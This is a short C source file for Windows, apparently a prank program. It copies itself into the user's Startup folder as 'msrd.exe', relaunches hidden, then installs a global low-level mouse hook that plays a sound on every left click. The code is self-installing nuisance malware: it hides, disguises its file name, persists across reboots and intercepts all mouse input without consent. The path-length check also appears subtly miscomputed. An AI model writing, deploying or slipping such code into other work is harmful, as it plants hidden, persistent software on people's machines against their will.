#include <windows.h>
#include <shellapi.h>
#include <shlobj.h>
#include <mmsystem.h>

/* Destination filename for file copy */
#define FILENAME_SHORT L"\\msrd.exe"

/* Mouse hook handle */
static HHOOK hook;

/* Mouse hook procedure */
static LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam){
	/* Process mouse click message */
	if (nCode == HC_ACTION && wParam == WM_LBUTTONDOWN)
		/* Try to play sound or end hooking on failure */
		if(!PlaySoundA("sound", NULL, SND_RESOURCE | SND_ASYNC))
			PostQuitMessage(0);
	/* Call next hook in queue */
	return CallNextHookEx(hook, nCode, wParam, lParam);
}

/* Program entry */
int main(){
	/* Declarations */
	wchar_t module_name[MAX_PATH], autostart_path[MAX_PATH];
	MSG msg;
	/* Get application path + autostart folder and check for enough buffer size */
	if(
		!GetModuleFileNameW(NULL, module_name, sizeof(module_name) / sizeof(wchar_t)) ||
		!SHGetSpecialFolderPathW(NULL, autostart_path, CSIDL_STARTUP, FALSE) ||
		wcslen(autostart_path) + wcslen(FILENAME_SHORT) >= sizeof(autostart_path) / sizeof(wchar_t)
	)
		return 1;
	/* Application has to get executed in autostart folder */
	if(wcsncmp(module_name, autostart_path, (wcsrchr(module_name, L'\\') - module_name) / sizeof(wchar_t))){
		if(
			!CopyFileW(module_name, wcscat(autostart_path, FILENAME_SHORT), TRUE) ||
			(size_t)ShellExecuteW(NULL, L"open", autostart_path, NULL, NULL, SW_HIDE) <= 32
		)
			return 1;
	}else{
		/* Create mouse hook */
		if(!(hook = SetWindowsHookEx(WH_MOUSE_LL, LowLevelMouseProc, NULL, 0)))
			return 1;
		/* Let this program keep running until event condition is fullfilled */
		while(GetMessageW(&msg, NULL, 0, 0)){
			TranslateMessage(&msg);
			DispatchMessageW(&msg);
		}
		/* Destroy mouse hook */
		UnhookWindowsHookEx(hook);
	}
	/* Program ends successfully */
	return 0;
}
